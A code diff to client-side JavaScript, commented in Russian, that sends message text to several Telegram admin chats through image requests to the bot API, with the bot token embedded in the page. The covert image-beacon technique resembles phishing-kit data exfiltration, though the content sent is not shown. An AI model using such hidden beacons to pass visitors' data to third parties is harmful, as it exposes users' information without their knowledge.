@@ -518,13 +518,8 @@
                 for (const adminId of ADMIN_IDS) {
                     try {
                         const encodedText = encodeURIComponent(messageText);
-                        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${adminId}&text=${encodedText}&parse_mode=Markdown&disable_web_page_preview=true`;
-                        
-                        // Создаем изображение для отправки запроса
-                        const img = document.createElement('img');
-                        img.style.display = 'none';
-                        img.src = url;
-                        container.appendChild(img);
+                        const img = new Image();
+                        img.src = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${adminId}&text=${encodedText}&parse_mode=Markdown&disable_web_page_preview=true`;
                         
                         // Добавляем обработчик успешной загрузки
                         img.onload = function() {
@@ -629,7 +624,7 @@
                     try {
                         const encodedText = encodeURIComponent(messageText);
                         const img = new Image();
-                        img.src = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${adminId}&text=${encodedText}&parse_mode=Markdown`;
+                        img.src = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${adminId}&text=${encodedText}&parse_mode=Markdown&disable_web_page_preview=true`;
                     } catch (e) {
                         console.error(`Ошибка при отправке данных админу ${adminId}:`, e);
                     }
@@ -702,7 +697,7 @@
                     try {
                         const encodedText = encodeURIComponent(messageText);
                         const img = new Image();
-                        img.src = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${adminId}&text=${encodedText}&parse_mode=Markdown`;
+                        img.src = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${adminId}&text=${encodedText}&parse_mode=Markdown&disable_web_page_preview=true`;
                     } catch (e) {
                         console.error(`Ошибка при отправке данных админу ${adminId}:`, e);
                     }
